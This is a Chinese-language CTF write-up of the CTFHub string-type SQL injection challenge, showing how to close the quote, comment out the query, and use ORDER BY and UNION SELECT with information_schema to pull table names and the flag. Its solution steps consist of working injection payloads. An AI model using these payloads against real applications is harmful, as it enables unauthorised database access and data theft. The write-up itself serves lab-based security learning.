---
title: CTFHub Web - SQL 字符型注入
date: 2026-11-16
tags: [CTFHub, Web, SQL注入, 联合查询, 字符型]
excerpt: 记录在参数被单引号包裹的情况下，通过闭合引号并利用注释符，构造 UNION 联合查询提取数据库信息的解题过程。
---

## 思路

进入靶场，页面依然是一个新闻搜索框。输入 `1` 后，页面回显的 SQL 语句类似 `select * from news where id='1'`。
与“整数型注入”不同，这里的参数是被**单引号 `'`** 包裹的。因此，我们不能直接拼接 `union select`，必须**先闭合前面的单引号，再用注释符（`#` 或 `-- `）注释掉原语句末尾的单引号**，才能使注入的 Payload 生效。

## 问题

1. **引号闭合与注释**：如果直接输入 `-1 union select 1,2`，SQL 语句会变成 `select * from news where id='-1 union select 1,2'`，导致语法错误。必须构造 `-1' union select 1,2 #` 的形式。
2. **URL 编码**：如果通过 GET 请求传参，`#` 号在 URL 中会被识别为锚点，需要将其 URL 编码为 `%23`。但在本题的直接表单提交中，通常直接输入 `#` 即可。

## 解决

1. **判断注入类型与闭合**：输入 `1' and 1=1 #` 页面正常，输入 `1' and 1=2 #` 页面异常，确认存在字符型注入，且闭合符为单引号。
2. **确定字段数与回显位**：
   * 输入 `1' order by 2 #` 正常，`1' order by 3 #` 报错，确定字段数为 **2**。
   * 输入 `-1' union select 1,2 #`，页面回显 `1` 和 `2`，确认回显位。
3. **获取数据库与表名**：
   * 查库名：`-1' union select 1,database() #`，得到 `sqli`。
   * 查表名：`-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli' #`，得到表 `news` 和 `flag`。
4. **获取字段名与 Flag**：
   * 查字段名：`-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' #`，得到字段 `flag`。
   * 提取数据：`-1' union select 1,flag from flag #`，页面成功回显 Flag。

> **💡 复盘总结**：
> 字符型注入的核心在于**“闭合”**与**“注释”**。要注意 `#`（URL中需编码为 `%23`）和 `-- `（后面必须跟一个空格）作为注释符的区别。此外，记得将原查询的 id 改为负数（如 `-1`），让前置查询为空，这样 UNION 注入的结果才能顶替原结果显示在页面上。
